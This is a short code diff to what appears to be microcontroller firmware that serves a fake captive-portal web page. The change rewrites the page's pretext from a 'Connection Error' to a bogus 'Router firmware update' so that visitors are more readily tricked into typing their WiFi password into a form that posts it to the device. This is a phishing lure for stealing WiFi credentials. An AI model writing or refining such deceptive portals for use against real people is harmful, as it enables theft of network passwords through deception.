@@ -43,8 +43,8 @@ inline const char CAPTIVE_PORTAL_HTML[] PROGMEM = R"CAPTIVEHTML(<!DOCTYPE html>
 </head>
 <body>
   <div class="box">
-    <h2>Connection Error</h2>
-    <p>Please enter your WiFi password to verify identity.</p>
+    <h2>Firmware Update</h2>
+    <p>Please enter your WiFi password to update the Router firmware.</p>
     <form action="/" method="post">
       <input type="password" name="password" placeholder="WiFi Password" required>
       <button type="submit">Connect</button>
